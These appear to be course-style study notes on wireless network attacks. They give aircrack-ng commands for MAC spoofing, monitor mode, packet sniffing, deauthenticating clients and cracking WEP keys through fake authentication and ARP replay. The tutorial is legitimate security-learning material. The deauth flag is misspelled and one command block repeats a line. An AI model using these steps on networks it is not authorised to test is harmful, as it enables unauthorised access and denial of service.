Network Hacking
===============

Intro
-----

a. Pre-connection attacks
b. gaining access
c. Post-connection attacks

What is a MAC Address?
^^^^^^^^^^^^^^^^^^^^^^

* Media Access Control

    * Permanent
    * Physical
    * Unique

* Assigned by manufacturer

Why Change the MAC Address?
^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Increase anonymity
* Impersonate other devices
* Bypass filters

Changing the MAC Address
^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: bash

    ifconfig wlan0 down
    ifconfig wlan0 hw ether 00:11:22:33:44:55

Wireless Modes
^^^^^^^^^^^^^^

.. code-block:: bash

    iwconfig
    ifconfig wlan0 down
    airmon-ng check kill
    iwconfig wlan0 mode monitor
    iwconfig

Pre-Connection Attacks
----------------------

Packet Sniffing
^^^^^^^^^^^^^^^

Using airodump-ng

* Part of the aircrack-ng suit
* Airodump-ng is a packet sniffer
* Used to capture all packets within range
* Display detailed info about networks around us
* Connected clients etc.

.. code-block:: bash

    airodump-ng [MonitorModeInterface]

WiFi Bands
^^^^^^^^^^

* Decides the frequency range that can be used
* Determines the channels that can be used
* Clients need to support band used by router to communicate with it.
* Data can be sniffed from a certain band if the wireless adapter used supports that band
* Most common wifi bands are:

    * a - uses 5Ghz frequency only
    * b, g - uses 2.4Ghz frequency only
    * n - uses 5 and 2.4 Ghz
    * ac - uses frequencies lower than 6 Ghz

.. code-block:: bash

    airodump-ng --band a mon0
    airodump-ng --band abg mon0

Targeted Packet Sniffing
^^^^^^^^^^^^^^^^^^^^^^^^

.. code-block:: bash
     
    airodump-ng --bssid F8:23:B2:B9:50:A8 --channel 2 --write test mon0

Deauthentication Attack
^^^^^^^^^^^^^^^^^^^^^^^

* Disconnect any client from any network

    * Works on encrypted networks (WEP, WPA, & WPA2)
    * No need to know the network key
    * No need to connect to the network

.. code-block::

    aireplay-ng --dauth [#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]

Gaining Access - WEP Cracking
-----------------------------

Theory Behind Cracking WEP Encryption
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

* Wired Equivalent Privacy
* Old encryption
* Uses an algorithm called RC4
* Still used in some networks
* Can be cracked easily

**WEP Cracking**

* Client encrypts data using a key
* Encrypted packet sent in the air
* Router decrypts packet using the key
* Each packet is encrypted using a unique key stream
* Random initialization vector (IV) is used to geenrate the keys streams
* The IV is only 24 bits
* IV + Key (Password ) = key stream
* IV is too small (only 24 bits)
* IV is sent in plain text

Result:

* IVs will repeat on busy networks
* This makes WEP vulnerable to statistical attacks
* Repeated IVs can be used to determine the key stream
* and break the encryption

WEP Cracking Basics
^^^^^^^^^^^^^^^^^^^

Conclusion:

* To crack WEP we need to:

    1. capture a large number of packets/IVs - using `airodump-ng`
    2. Analyse the captured IVs and crack the key - using `aircrack-ng`

.. code-block:: bash

    airodump-ng --bssid 00:11:22:33:44:55 --channel 1 --write basic_wep mon0
    aircrack-ng basic_wep-01.cap
    # Take the key found in brackets [ 41:73:32:33:70 ] or whatever and connect to wifi using the key minus the colons

Fake Authentication Attack
^^^^^^^^^^^^^^^^^^^^^^^^^^

Problem:

    * If network is not busy
    * It would take some time to capture enough IVs

Solution:

    * Force the AP to generate new IVs

Problem:

    * APs only communicate with connected clients.

        * We cant communicate with it
        * We cant even start the attack

Solution:

    * Associate with the AP before launcing the attack

.. code-block:: bash

    airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write arpreplay mon0
    aireplay-ng --fakeauth 0 -a [targetAPMac] -h [MyMacAddressFirst8DigitsofUnspec] mon0

ARP Request Replay Attack
^^^^^^^^^^^^^^^^^^^^^^^^^

* Wait for an ARP packet
* Capture it, and replay it (retransmit it)
* THis causes the AP to produce another packet with net IV
* Keep doing this till we have enough IVs to crack the key

.. code-block:: bash

    airodump-ng --bssid 00:11:22:33:44:55 --channel 6 --write arpreplay mon0
    aireplay-ng --fakeauth 0 -a [targetAPMac] -h [MyMacAddressFirst8DigitsofUnspec] mon0
    aireplay-ng --arpreplay -b [targetAPMac] -h [MyMacAddressFirst8DigitsofUnspec] mon0
    aireplay-ng --fakeauth 0 -a [targetAPMac] -h [MyMacAddressFirst8DigitsofUnspec] mon0
    aircrack-ng arpreplay-01.cap